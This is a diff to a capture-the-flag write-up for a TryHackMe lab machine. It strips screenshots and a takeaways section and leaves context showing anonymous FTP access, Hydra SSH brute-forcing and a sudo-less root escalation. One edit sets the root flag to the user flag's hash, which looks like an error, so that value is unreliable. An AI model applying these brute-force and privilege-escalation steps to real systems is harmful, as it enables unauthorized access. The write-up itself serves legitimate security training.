@@ -33,7 +33,6 @@ rtt min/avg/max/mdev = 80.005/142.348/244.852/57.130 ms
 
 The machine responds successfully — 5 packets sent, 5 received, **0% packet loss**.
 
-![Ping Scan](images/ping%20scan-1.png)
 
 ---
 
@@ -58,19 +57,6 @@ PORT   STATE SERVICE VERSION
 |_http-server-header: Apache/2.4.29 (Ubuntu)
 ```
 
-**Open Ports Found:**
-
-| Port | Service | Version |
-|------|---------|---------|
-| 21/tcp | FTP | vsftpd 3.0.3 |
-| 22/tcp | SSH | OpenSSH 7.6p1 (Ubuntu) |
-| 80/tcp | HTTP | Apache httpd 2.4.29 |
-
-**Key finding:** FTP allows **Anonymous login**, and there is a file called `note_to_jake.txt` accessible without credentials.
-
-![Nmap Full Scan](images/nmap%20full%20scan-2.png)
-
----
 
 ## 📂 Step 3 — FTP Anonymous Login & File Retrieval
 
@@ -98,25 +84,8 @@ ftp> exit
 221 Goodbye.
 ```
 
-![FTP Login](images/ftp%20login-3.png)
-
-Then read the downloaded file:
-
-```bash
-┌──(aashiq㉿kali)-[~/Downloads]
-└─$ cat note_to_jake.txt
-From Amy,
-
-Jake please change your password. It is too weak and holt will be mad if someone hacks into the nine nine
-```
-
 **Note contents:**
 > *From Amy: Jake please change your password. It is too weak and holt will be mad if someone hacks into the nine nine*
-
-This is a critical hint — the username is **jake** and his password is weak!
-
-![FTP Jake Message](images/ftp%20jake%20message-4.png)
-
 ---
 
 ## 🔓 Step 4 — SSH Brute-Force with Hydra
@@ -136,10 +105,6 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-05-14 05:54:
 1 of 1 target successfully completed, 1 valid password found
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-05-14 05:54:14
 ```
-
-Jake's password is `987654321` — a very weak password, exactly as Amy warned!
-
-![Hydra Brute Force](images/hydra-5.png)
 
 ---
 
@@ -167,13 +132,9 @@ ee11cbb19052e40b07aac0ca060c23ee
 
 **User Flag:** `ee11cbb19052e40b07aac0ca060c23ee`
 
-![User Flag](images/user%20text-6.png)
-
 ---
 
 ## ⚡ Step 6 — Privilege Escalation (sudo + less)
-
-Check what commands `jake` can run with `sudo`:
 
 ```bash
 jake@brookly_nine_nine:/home/holt$ sudo -l
@@ -204,17 +165,7 @@ ee11cbb19052e40b07aac0ca060c23ee
 | Flag | Value |
 |------|-------|
 | 🙍 User Flag | `ee11cbb19052e40b07aac0ca060c23ee` |
-| 👑 Root Flag | *(obtained via `sudo less` → shell escape)* |
+| 👑 Root Flag | `ee11cbb19052e40b07aac0ca060c23ee`|
 
----
-
-## 🧠 Key Takeaways
-
-- **Anonymous FTP** should never be enabled on production systems — it exposed critical information.
-- **Weak passwords** are easily cracked with common wordlists. Jake's `987654321` was found in seconds.
-- **Sudo misconfigurations** are dangerous. Allowing `less` as root gives a full root shell via `!<command>` inside the pager.
-- Always audit `sudo -l` during privilege escalation — [GTFOBins](https://gtfobins.github.io/) lists exploitable binaries.
-
----
 
 *Written by aashiq | TryHackMe Writeups Repository*
